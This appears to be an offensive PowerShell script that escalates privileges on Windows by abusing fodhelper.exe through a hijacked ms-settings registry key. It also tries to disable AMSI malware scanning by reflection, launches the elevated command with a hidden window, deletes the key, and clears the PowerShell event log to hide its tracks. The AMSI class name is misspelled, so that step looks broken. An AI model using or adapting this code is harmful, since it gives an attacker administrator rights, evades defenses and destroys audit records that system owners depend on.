# LPE abusing fodhelper.exe

# amsi bypass
$e608269fb8e34df4ba8c6ae05a6b6962 = [Ref].Assembly.GetType("System.Manegement.Automation.AmsiUtils")
$d11144196aed47ffab91d7b563e06029 = $e608269fb8e34df4ba8c6ae05a6b6962.GetField("AmsiInitFailed", "NonPublic,Static")
$d11144196aed47ffab91d7b563e06029.SetValue($null, $true)

# reg key obfuscation
$e1651213d74c48c7b9485b28c9862b73 = "HKCU:\Software\Classes\{0}\shell\open\command" -f ('ms-settings')
$c0cb8019ac3f4037b4759730b58ea6ee = "cmd /c start /min powershell -ep bypass -file C:\Users\thierry\Desktop\psehjwad\test_elevation.ps1" 

New-Item $e1651213d74c48c7b9485b28c9862b73 -Force | Out-Null
Set-ItemProperty $e1651213d74c48c7b9485b28c9862b73 -Name "DelegateExecute" -Value ""
Set-ItemProperty $e1651213d74c48c7b9485b28c9862b73 -Name "(Default)" -Value $c0cb8019ac3f4037b4759730b58ea6ee

# fodhelper exploit with no detection (i think so)
Start-Process "cmd.exe" -ArgumentList "/c start fodhelper.exe" -WindowStyle Hidden


Start-Sleep 3
Remove-Item $e1651213d74c48c7b9485b28c9862b73 -Force -Recurse -ErrorAction SilentlyContinue

# hide logs
wevtutil cl "Microsoft-Windows-PowerShell/Operational"